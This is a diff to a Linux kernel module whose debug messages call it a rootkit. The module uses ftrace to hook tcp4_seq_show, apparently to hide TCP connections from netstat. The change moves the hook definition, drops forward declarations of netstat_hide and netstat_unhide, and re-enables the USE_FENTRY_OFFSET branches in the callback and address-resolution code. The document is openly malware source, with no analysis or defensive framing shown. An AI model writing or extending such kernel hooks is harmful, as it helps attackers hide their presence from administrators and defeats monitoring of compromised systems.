@@ -21,7 +21,6 @@
     .original = (_orig),        \
 }
 static asmlinkage long (*org_tcp4_seq_show)(struct seq_file *seq, void *v);
-static void netstat_unhide(void);
 static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
 {
     long ret;
@@ -45,18 +44,18 @@ struct ftrace_hook {
 	struct ftrace_ops ops;
 };
 
+struct ftrace_hook tcp4_hook = HOOK("tcp4_seq_show", hook_tcp4_seq_show, &org_tcp4_seq_show);
 
-static int netstat_hide(void);
 static void notrace register_callback_hook(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct pt_regs *regs)
 {
 	struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
 
-/*#if USE_FENTRY_OFFSET
+#if USE_FENTRY_OFFSET
 	regs->ip = (unsigned long) hook->function;
-#else*/
+#else
 	if(!within_module(parent_ip, THIS_MODULE))
 		regs->ip = (unsigned long) hook->function;
-//#endif
+#endif
 }
 
 static int fh_resolve_hook_address(struct ftrace_hook *hook)
@@ -69,11 +68,11 @@ static int fh_resolve_hook_address(struct ftrace_hook *hook)
 		return -ENOENT;
 	}
 
-/*#if USE_FENTRY_OFFSET
+#if USE_FENTRY_OFFSET
 	*((unsigned long*) hook->original) = hook->addr + MCOUNT_INSN_SIZE;
-#else*/
+#else
 	*((unsigned long*) hook->original) = hook->addr;
-//#endif
+#endif
 
 	return 0;
 }
@@ -112,7 +111,6 @@ void fh_remove_hook(struct ftrace_hook *hook)
 		printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
 	}
 }
-struct ftrace_hook tcp4_hook = HOOK("tcp4_seq_show", hook_tcp4_seq_show, &org_tcp4_seq_show);
 /*
 static int netstat_hide(void)
 {
